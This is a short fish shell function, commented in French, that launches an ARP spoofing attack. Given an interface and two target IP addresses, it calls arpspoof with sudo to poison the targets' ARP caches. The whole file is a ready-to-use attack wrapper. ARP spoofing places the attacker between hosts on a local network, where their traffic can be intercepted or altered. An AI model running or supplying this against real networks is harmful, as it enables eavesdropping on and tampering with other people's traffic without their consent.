function arp_spoof -d "Effectue une attaque ARP spoofing"
    # Usage: arp_spoof <interface> <ip_cible_1> <ip_cible_2>
    #
    # Arguments:
    #   interface   L'interface réseau à utiliser
    #   ip_cible_1  L'adresse IP de la première cible
    #   ip_cible_2  L'adresse IP de la deuxième cible
    #
    # Exemple:
    #   arp_spoof eth0 192.168.1.2 192.168.1.1
    #
    # Note: Cette fonction nécessite des privilèges sudo

    if test (count $argv) -ne 3
        echo "Usage: arp_spoof <interface> <ip_cible_1> <ip_cible_2>"
        return 1
    end

    set -l interface $argv[1]
    set -l ip_cible_1 $argv[2]
    set -l ip_cible_2 $argv[3]
    
    echo "Lancement de l'attaque ARP spoofing sur l'interface $interface entre les cibles $ip_cible_1 et $ip_cible_2..."
    sudo arpspoof -i $interface -t $ip_cible_1 $ip_cible_2
end

